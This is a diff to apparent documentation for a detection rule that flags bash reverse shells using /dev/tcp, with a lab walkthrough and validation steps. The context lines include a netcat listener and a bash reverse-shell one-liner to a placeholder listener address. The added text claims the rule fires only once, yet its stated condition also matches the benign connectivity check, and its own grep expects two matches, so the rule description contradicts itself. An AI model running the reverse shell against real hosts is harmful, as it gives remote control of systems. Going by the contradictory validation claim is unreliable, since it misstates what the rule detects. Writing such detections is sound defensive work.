@@ -19,3 +19,20 @@ nc -lvnp 4444
 
 # On the target lab host:
 bash -c 'bash -i >& /dev/tcp/LISTENER_IP/4444 0>&1
+
+## Proof / validation
+
+Sample log: [`tests/reverse_shell_devtcp_sample.log`](../tests/reverse_shell_devtcp_sample.log)
+
+Three EXECVE events: one real `/dev/tcp` reverse shell, one benign
+`/dev/tcp` connectivity check, one unrelated `ls`.
+
+Rule condition: `Image endswith /bash` AND `CommandLine contains /dev/tcp/`.
+→ Only the first event matches → **rule fires once**.
+
+Validate locally:
+
+```bash
+grep '/dev/tcp/' tests/reverse_shell_devtcp_sample.log | \
+  grep -c 'bash'
+# expected: 2  (the shell + the connectivity check, both use bash+/dev/tcp)
